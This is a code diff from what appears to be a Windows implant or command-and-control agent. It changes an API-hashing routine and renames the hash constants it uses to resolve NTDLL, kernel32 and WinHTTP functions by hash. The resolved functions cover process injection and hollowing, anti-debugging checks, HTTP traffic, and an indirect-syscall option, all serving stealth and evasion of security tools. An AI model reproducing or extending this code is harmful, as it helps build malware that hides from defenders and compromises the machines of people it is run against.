@@ -4,13 +4,44 @@ namespace Procs
 {
     DWORD GetHashFromString(char* str)
     {
-        size_t dwStringLength = strlen(str);
+        int c;
         DWORD dwHash = HASH_IV;
 
-        for (size_t i = 0; i < dwStringLength; i++)
+        while (c = *str++)
         {
-            dwHash = dwHash * RANDOM_ADDR + static_cast<int>(str[i]);
+            dwHash = dwHash * RANDOM_ADDR + c;
         }
+
+        return dwHash & 0xFFFFFFFF;
+    }
+
+    DWORD GetHashFromStringPtr(PVOID pStr, SIZE_T dwStrLen)
+    {
+        ULONG   dwHash  = HASH_IV;
+        PUCHAR  puStr   = static_cast<PUCHAR>(pStr);
+
+        do
+        {
+            UCHAR c = *puStr;
+
+            if (!dwStrLen)
+            {
+                if (!*puStr) break;
+            }
+            else
+            {
+                if ((ULONG) (puStr - (PUCHAR)pStr) >= dwStrLen) break;
+                if (!*puStr) ++puStr;
+            }
+
+            if (c >= 'a')
+            {
+                c -= 0x20;
+            }
+
+            dwHash = dwHash * RANDOM_ADDR + c;
+            ++puStr;
+        } while (TRUE);
 
         return dwHash & 0xFFFFFFFF;
     }
@@ -51,7 +82,6 @@ namespace Procs
         return nullptr;
     }
 
-
     PPROCS FindProcs(
         HMODULE hNTDLL,
         HMODULE hKernel32DLL,
@@ -61,123 +91,123 @@ namespace Procs
         PPROCS pProcs = new PROCS;
     
         // NTAPI
-        PVOID pNtAdjustPrivilegesToken          = GetProcAddressByHash(hNTDLL, APIHASH_NTADJUSTPRIVILEGESTOKEN);
+        PVOID pNtAdjustPrivilegesToken          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTADJUSTPRIVILEGESTOKEN);
         pProcs->lpNtAdjustPrivilegesToken       = reinterpret_cast<LPPROC_NTADJUSTPRIVILEGESTOKEN>(pNtAdjustPrivilegesToken);
-        PVOID pNtAllocateVirtualMemory          = GetProcAddressByHash(hNTDLL, APIHASH_NTALLOCATEVIRTUALMEMORY);
+        PVOID pNtAllocateVirtualMemory          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTALLOCATEVIRTUALMEMORY);
         pProcs->lpNtAllocateVirtualMemory       = reinterpret_cast<LPPROC_NTALLOCATEVIRTUALMEMORY>(pNtAllocateVirtualMemory);
-        PVOID pNtClose                          = GetProcAddressByHash(hNTDLL, APIHASH_NTCLOSE);
+        PVOID pNtClose                          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCLOSE);
         pProcs->lpNtClose                       = reinterpret_cast<LPPROC_NTCLOSE>(pNtClose);
-        PVOID pNtCreateFile                     = GetProcAddressByHash(hNTDLL, APIHASH_NTCREATEFILE);
+        PVOID pNtCreateFile                     = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATEFILE);
         pProcs->lpNtCreateFile                  = reinterpret_cast<LPPROC_NTCREATEFILE>(pNtCreateFile);
-        PVOID pNtCreateNamedPipeFile            = GetProcAddressByHash(hNTDLL, APIHASH_NTCREATENAMEDPIPEFILE);
+        PVOID pNtCreateNamedPipeFile            = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATENAMEDPIPEFILE);
         pProcs->lpNtCreateNamedPipeFile         = reinterpret_cast<LPPROC_NTCREATENAMEDPIPEFILE>(pNtCreateNamedPipeFile);
-        PVOID pNtCreateProcessEx                = GetProcAddressByHash(hNTDLL, APIHASH_NTCREATEPROCESSEX);
+        PVOID pNtCreateProcessEx                = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATEPROCESSEX);
         pProcs->lpNtCreateProcessEx             = reinterpret_cast<LPPROC_NTCREATEPROCESSEX>(pNtCreateProcessEx);
-        PVOID pNtCreateThreadEx                 = GetProcAddressByHash(hNTDLL, APIHASH_NTCREATETHREADEX);
+        PVOID pNtCreateThreadEx                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATETHREADEX);
         pProcs->lpNtCreateThreadEx              = reinterpret_cast<LPPROC_NTCREATETHREADEX>(pNtCreateThreadEx);
-        PVOID pNtDeleteFile                     = GetProcAddressByHash(hNTDLL, APIHASH_NTDELETEFILE);
+        PVOID pNtDeleteFile                     = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTDELETEFILE);
         pProcs->lpNtDeleteFile                  = reinterpret_cast<LPPROC_NTDELETEFILE>(pNtDeleteFile);
-        PVOID pNtDuplicateObject                = GetProcAddressByHash(hNTDLL, APIHASH_NTDUPLICATEOBJECT);
+        PVOID pNtDuplicateObject                = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTDUPLICATEOBJECT);
         pProcs->lpNtDuplicateObject             = reinterpret_cast<LPPROC_NTDUPLICATEOBJECT>(pNtDuplicateObject);
-        PVOID pNtEnumerateValueKey              = GetProcAddressByHash(hNTDLL, APIHASH_NTENUMERATEVALUEKEY);
+        PVOID pNtEnumerateValueKey              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTENUMERATEVALUEKEY);
         pProcs->lpNtEnumerateValueKey           = reinterpret_cast<LPPROC_NTENUMERATEVALUEKEY>(pNtEnumerateValueKey);
-        PVOID pNtFreeVirtualMemory              = GetProcAddressByHash(hNTDLL, APIHASH_NTFREEVIRTUALMEMORY);
+        PVOID pNtFreeVirtualMemory              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTFREEVIRTUALMEMORY);
         pProcs->lpNtFreeVirtualMemory           = reinterpret_cast<LPPROC_NTFREEVIRTUALMEMORY>(pNtFreeVirtualMemory);
-        PVOID pNtGetContextThread               = GetProcAddressByHash(hNTDLL, APIHASH_NTGETCONTEXTTHREAD);
+        PVOID pNtGetContextThread               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTGETCONTEXTTHREAD);
         pProcs->lpNtGetContextThread            = reinterpret_cast<LPPROC_NTGETCONTEXTTHREAD>(pNtGetContextThread);
-        PVOID pNtOpenFile                       = GetProcAddressByHash(hNTDLL, APIHASH_NTOPENFILE);
+        PVOID pNtOpenFile                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENFILE);
         pProcs->lpNtOpenFile                    = reinterpret_cast<LPPROC_NTOPENFILE>(pNtOpenFile);
-        PVOID pNtOpenKeyEx                      = GetProcAddressByHash(hNTDLL, APIHASH_NTOPENKEYEX);
+        PVOID pNtOpenKeyEx                      = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENKEYEX);
         pProcs->lpNtOpenKeyEx                   = reinterpret_cast<LPPROC_NTOPENKEYEX>(pNtOpenKeyEx);
-        PVOID pNtOpenProcess                    = GetProcAddressByHash(hNTDLL, APIHASH_NTOPENPROCESS);
+        PVOID pNtOpenProcess                    = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENPROCESS);
         pProcs->lpNtOpenProcess                 = reinterpret_cast<LPPROC_NTOPENPROCESS>(pNtOpenProcess);
-        PVOID pNtOpenProcessToken               = GetProcAddressByHash(hNTDLL, APIHASH_NTOPENPROCESSTOKEN);
+        PVOID pNtOpenProcessToken               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENPROCESSTOKEN);
         pProcs->lpNtOpenProcessToken            = reinterpret_cast<LPPROC_NTOPENPROCESSTOKEN>(pNtOpenProcessToken);
-        PVOID pNtPrivilegeCheck                 = GetProcAddressByHash(hNTDLL, APIHASH_NTPRIVILEGECHECK);
+        PVOID pNtPrivilegeCheck                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTPRIVILEGECHECK);
         pProcs->lpNtPrivilegeCheck              = reinterpret_cast<LPPROC_NTPRIVILEGECHECK>(pNtPrivilegeCheck);
-        PVOID pNtProtectVirtualMemory           = GetProcAddressByHash(hNTDLL, APIHASH_NTPROTECTVIRTUALMEMORY);
+        PVOID pNtProtectVirtualMemory           = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTPROTECTVIRTUALMEMORY);
         pProcs->lpNtProtectVirtualMemory        = reinterpret_cast<LPPROC_NTPROTECTVIRTUALMEMORY>(pNtProtectVirtualMemory);
-        PVOID pNtQueryInformationFile           = GetProcAddressByHash(hNTDLL, APIHASH_NTQUERYINFORMATIONFILE);
+        PVOID pNtQueryInformationFile           = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONFILE);
         pProcs->lpNtQueryInformationFile        = reinterpret_cast<LPPROC_NTSETINFORMATIONFILE>(pNtQueryInformationFile);
-        PVOID pNtQueryInformationProcess        = GetProcAddressByHash(hNTDLL, APIHASH_NTQUERYINFORMATIONPROCESS);
+        PVOID pNtQueryInformationProcess        = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONPROCESS);
         pProcs->lpNtQueryInformationProcess     = reinterpret_cast<LPPROC_NTQUERYINFORMATIONPROCESS>(pNtQueryInformationProcess);
-        PVOID pNtQueryInformationToken          = GetProcAddressByHash(hNTDLL, APIHASH_NTQUERYINFORMATIONTOKEN);
+        PVOID pNtQueryInformationToken          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONTOKEN);
         pProcs->lpNtQueryInformationToken       = reinterpret_cast<LPPROC_NTQUERYINFORMATIONTOKEN>(pNtQueryInformationToken);
-        PVOID pNtQueryKey                       = GetProcAddressByHash(hNTDLL, APIHASH_NTQUERYKEY);
+        PVOID pNtQueryKey                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYKEY);
         pProcs->lpNtQueryKey                    = reinterpret_cast<LPPROC_NTQUERYKEY>(pNtQueryKey);
-        PVOID pNtQuerySystemInformation         = GetProcAddressByHash(hNTDLL, APIHASH_NTQUERYSYSTEMINFORMATION);
+        PVOID pNtQuerySystemInformation         = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYSYSTEMINFORMATION);
         pProcs->lpNtQuerySystemInformation      = reinterpret_cast<LPPROC_NTQUERYSYSTEMINFORMATION>(pNtQuerySystemInformation);
-        PVOID pNtReadFile                       = GetProcAddressByHash(hNTDLL, APIHASH_NTREADFILE);
+        PVOID pNtReadFile                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTREADFILE);
         pProcs->lpNtReadFile                    = reinterpret_cast<LPPROC_NTREADFILE>(pNtReadFile);
-        PVOID pNtReadVirtualMemory              = GetProcAddressByHash(hNTDLL, APIHASH_NTREADVIRTUALMEMORY);
+        PVOID pNtReadVirtualMemory              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTREADVIRTUALMEMORY);
         pProcs->lpNtReadVirtualMemory           = reinterpret_cast<LPPROC_NTREADVIRTUALMEMORY>(pNtReadVirtualMemory);
-        PVOID pNtResumeThread                   = GetProcAddressByHash(hNTDLL, APIHASH_NTRESUMETHREAD);
+        PVOID pNtResumeThread                   = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTRESUMETHREAD);
         pProcs->lpNtResumeThread                = reinterpret_cast<LPPROC_NTRESUMETHREAD>(pNtResumeThread);
-        PVOID pNtSetContextThread               = GetProcAddressByHash(hNTDLL, APIHASH_NTSETCONTEXTTHREAD);
+        PVOID pNtSetContextThread               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSETCONTEXTTHREAD);
         pProcs->lpNtSetContextThread            = reinterpret_cast<LPPROC_NTSETCONTEXTTHREAD>(pNtSetContextThread);
-        PVOID pNtSetInformationFile             = GetProcAddressByHash(hNTDLL, APIHASH_NTSETINFORMATIONFILE);
+        PVOID pNtSetInformationFile             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSETINFORMATIONFILE);
         pProcs->lpNtSetInformationFile          = reinterpret_cast<LPPROC_NTSETINFORMATIONFILE>(pNtSetInformationFile);
-        PVOID pNtSystemDebugControl             = GetProcAddressByHash(hNTDLL, APIHASH_NTSYSTEMDEBUGCONTROL);
+        PVOID pNtSystemDebugControl             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSYSTEMDEBUGCONTROL);
         pProcs->lpNtSystemDebugControl          = reinterpret_cast<LPPROC_NTSYSTEMDEBUGCONTROL>(pNtSystemDebugControl);
-        PVOID pNtTerminateProcess               = GetProcAddressByHash(hNTDLL, APIHASH_NTTERMINATEPROCESS);
+        PVOID pNtTerminateProcess               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTTERMINATEPROCESS);
         pProcs->lpNtTerminateProcess            = reinterpret_cast<LPPROC_NTTERMINATEPROCESS>(pNtTerminateProcess);
-        PVOID pNtUnmapViewOfSection             = GetProcAddressByHash(hNTDLL, APIHASH_NTUNMAPVIEWOFSECTION);
+        PVOID pNtUnmapViewOfSection             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTUNMAPVIEWOFSECTION);
         pProcs->lpNtUnmapViewOfSection          = reinterpret_cast<LPPROC_NTUNMAPVIEWOFSECTION>(pNtUnmapViewOfSection);
-        PVOID pNtWaitForSingleObject            = GetProcAddressByHash(hNTDLL, APIHASH_NTWAITFORSINGLEOBJECT);
+        PVOID pNtWaitForSingleObject            = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWAITFORSINGLEOBJECT);
         pProcs->lpNtWaitForSingleObject         = reinterpret_cast<LPPROC_NTWAITFORSINGLEOBJECT>(pNtWaitForSingleObject);
-        PVOID pNtWriteFile                      = GetProcAddressByHash(hNTDLL, APIHASH_NTWRITEFILE);
+        PVOID pNtWriteFile                      = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWRITEFILE);
         pProcs->lpNtWriteFile                   = reinterpret_cast<LPPROC_NTWRITEFILE>(pNtWriteFile);
-        PVOID pNtWriteVirtualMemory             = GetProcAddressByHash(hNTDLL, APIHASH_NTWRITEVIRTUALMEMORY);
+        PVOID pNtWriteVirtualMemory             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWRITEVIRTUALMEMORY);
         pProcs->lpNtWriteVirtualMemory          = reinterpret_cast<LPPROC_NTWRITEVIRTUALMEMORY>(pNtWriteVirtualMemory);
-        PVOID pRtlAllocateHeap                  = GetProcAddressByHash(hNTDLL, APIHASH_RTLALLOCATEHEAP);
+        PVOID pRtlAllocateHeap                  = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLALLOCATEHEAP);
         pProcs->lpRtlAllocateHeap               = reinterpret_cast<LPPROC_RTLALLOCATEHEAP>(pRtlAllocateHeap);
-        PVOID pRtlGetCurrentDirectory_U         = GetProcAddressByHash(hNTDLL, APIHASH_RTLGETCURRENTDIRECTORY_U);
+        PVOID pRtlGetCurrentDirectory_U         = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLGETCURRENTDIRECTORY_U);
         pProcs->lpRtlGetCurrentDirectory_U      = reinterpret_cast<LPPROC_RTLGETCURRENTDIRECTORY_U>(pRtlGetCurrentDirectory_U);
-        PVOID pRtlGetFullPathName_U             = GetProcAddressByHash(hNTDLL, APIHASH_RTLGETFULLPATHNAME_U);
+        PVOID pRtlGetFullPathName_U             = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLGETFULLPATHNAME_U);
         pProcs->lpRtlGetFullPathName_U          = reinterpret_cast<LPPROC_RTLGETFULLPATHNAME_U>(pRtlGetFullPathName_U);
-        PVOID pRtlInitUnicodeString             = GetProcAddressByHash(hNTDLL, APIHASH_RTLINITUNICODESTRING);
+        PVOID pRtlInitUnicodeString             = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLINITUNICODESTRING);
         pProcs->lpRtlInitUnicodeString          = reinterpret_cast<LPPROC_RTLINITUNICODESTRING>(pRtlInitUnicodeString);
-        PVOID pRtlSetCurrentDirectory_U         = GetProcAddressByHash(hNTDLL, APIHASH_RTLSETCURRENTDIRECTORY_U);
+        PVOID pRtlSetCurrentDirectory_U         = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSETCURRENTDIRECTORY_U);
         pProcs->lpRtlSetCurrentDirectory_U      = reinterpret_cast<LPPROC_RTLSETCURRENTDIRECTORY_U>(pRtlSetCurrentDirectory_U);
-        PVOID pRtlStringCchCatW                 = GetProcAddressByHash(hNTDLL, APIHASH_RTLSTRINGCCHCATW);
+        PVOID pRtlStringCchCatW                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHCATW);
         pProcs->lpRtlStringCchCatW              = reinterpret_cast<LPPROC_RTLSTRINGCCHCATW>(pRtlStringCchCatW);
-        PVOID pRtlStringCchCopyW                = GetProcAddressByHash(hNTDLL, APIHASH_RTLSTRINGCCHCOPYW);
+        PVOID pRtlStringCchCopyW                = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHCOPYW);
         pProcs->lpRtlStringCchCopyW             = reinterpret_cast<LPPROC_RTLSTRINGCCHCOPYW>(pRtlStringCchCopyW);
-        PVOID pRtlStringCchLengthW              = GetProcAddressByHash(hNTDLL, APIHASH_RTLSTRINGCCHLENGTHW);
+        PVOID pRtlStringCchLengthW              = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHLENGTHW);
         pProcs->lpRtlStringCchLengthW           = reinterpret_cast<LPPROC_RTLSTRINGCCHLENGTHW>(pRtlStringCchLengthW);
-        PVOID pRtlZeroMemory                    = GetProcAddressByHash(hNTDLL, APIHASH_RTLZEROMEMORY);
+        PVOID pRtlZeroMemory                    = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLZEROMEMORY);
         pProcs->lpRtlZeroMemory                 = reinterpret_cast<LPPROC_RTLZEROMEMORY>(pRtlZeroMemory);
 
         // WINAPI
-        PVOID pCheckRemoteDebuggerPresent       = GetProcAddressByHash(hKernel32DLL, APIHASH_CHECKREMOTEDEBUGGERPRESENT);
+        PVOID pCheckRemoteDebuggerPresent       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CHECKREMOTEDEBUGGERPRESENT);
         pProcs->lpCheckRemoteDebuggerPresent    = reinterpret_cast<LPPROC_CHECKREMOTEDEBUGGERPRESENT>(pCheckRemoteDebuggerPresent);
-        PVOID pIsDebuggerPresent                = GetProcAddressByHash(hKernel32DLL, APIHASH_ISDEBUGGERPRESENT);
+        PVOID pIsDebuggerPresent                = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_ISDEBUGGERPRESENT);
         pProcs->lpIsDebuggerPresent             = reinterpret_cast<LPPROC_ISDEBUGGERPRESENT>(pIsDebuggerPresent);
-        PVOID pQueryFullProcessImageNameW       = GetProcAddressByHash(hKernel32DLL, APIHASH_QUERYFULLPROCESSIMAGENAMEW);
+        PVOID pQueryFullProcessImageNameW       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_QUERYFULLPROCESSIMAGENAMEW);
         pProcs->lpQueryFullProcessImageNameW    = reinterpret_cast<LPPROC_QUERYFULLPROCESSIMAGENAMEW>(pQueryFullProcessImageNameW);
-        PVOID pSetFileInformationByHandle       = GetProcAddressByHash(hKernel32DLL, APIHASH_SETFILEINFORMATIONBYHANDLE);
+        PVOID pSetFileInformationByHandle       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_SETFILEINFORMATIONBYHANDLE);
         pProcs->lpSetFileInformationByHandle    = reinterpret_cast<LPPROC_SETFILEINFORMATIONBYHANDLE>(pSetFileInformationByHandle);
-        PVOID pWinHttpCloseHandle               = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPCLOSEHANDLE);
+        PVOID pWinHttpCloseHandle               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPCLOSEHANDLE);
         pProcs->lpWinHttpCloseHandle            = reinterpret_cast<LPPROC_WINHTTPCLOSEHANDLE>(pWinHttpCloseHandle);
-        PVOID pWinHttpConnect                   = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPCONNECT);
+        PVOID pWinHttpConnect                   = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPCONNECT);
         pProcs->lpWinHttpConnect                = reinterpret_cast<LPPROC_WINHTTPCONNECT>(pWinHttpConnect);
-        PVOID pWinHttpOpen                      = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPOPEN);
+        PVOID pWinHttpOpen                      = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPOPEN);
         pProcs->lpWinHttpOpen                   = reinterpret_cast<LPPROC_WINHTTPOPEN>(pWinHttpOpen);
-        PVOID pWinHttpOpenRequest               = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPOPENREQUEST);
+        PVOID pWinHttpOpenRequest               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPOPENREQUEST);
         pProcs->lpWinHttpOpenRequest            = reinterpret_cast<LPPROC_WINHTTPOPENREQUEST>(pWinHttpOpenRequest);
-        PVOID pWinHttpQueryDataAvailable        = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPQUERYDATAAVAILABLE);
+        PVOID pWinHttpQueryDataAvailable        = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPQUERYDATAAVAILABLE);
         pProcs->lpWinHttpQueryDataAvailable     = reinterpret_cast<LPPROC_WINHTTPQUERYDATAAVAILABLE>(pWinHttpQueryDataAvailable);
-        PVOID pWinHttpQueryHeaders              = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPQUERYHEADERS);
+        PVOID pWinHttpQueryHeaders              = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPQUERYHEADERS);
         pProcs->lpWinHttpQueryHeaders           = reinterpret_cast<LPPROC_WINHTTPQUERYHEADERS>(pWinHttpQueryHeaders);
-        PVOID pWinHttpReceiveResponse           = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPRECEIVERESPONSE);
+        PVOID pWinHttpReceiveResponse           = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPRECEIVERESPONSE);
         pProcs->lpWinHttpReceiveResponse        = reinterpret_cast<LPPROC_WINHTTPRECEIVERESPONSE>(pWinHttpReceiveResponse);
-        PVOID pWinHttpReadData                  = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPREADDATA);
+        PVOID pWinHttpReadData                  = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPREADDATA);
         pProcs->lpWinHttpReadData               = reinterpret_cast<LPPROC_WINHTTPREADDATA>(pWinHttpReadData);
-        PVOID pWinHttpSendRequest               = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPSENDREQUEST);
+        PVOID pWinHttpSendRequest               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPSENDREQUEST);
         pProcs->lpWinHttpSendRequest            = reinterpret_cast<LPPROC_WINHTTPSENDREQUEST>(pWinHttpSendRequest);
-        PVOID pWinHttpSetOption                 = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPSETOPTION);
+        PVOID pWinHttpSetOption                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPSETOPTION);
         pProcs->lpWinHttpSetOption              = reinterpret_cast<LPPROC_WINHTTPSETOPTION>(pWinHttpSetOption);
-        PVOID pWinHttpWriteData                 = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPWRITEDATA);
+        PVOID pWinHttpWriteData                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPWRITEDATA);
         pProcs->lpWinHttpWriteData              = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);
         
         if (bIndirectSyscalls)
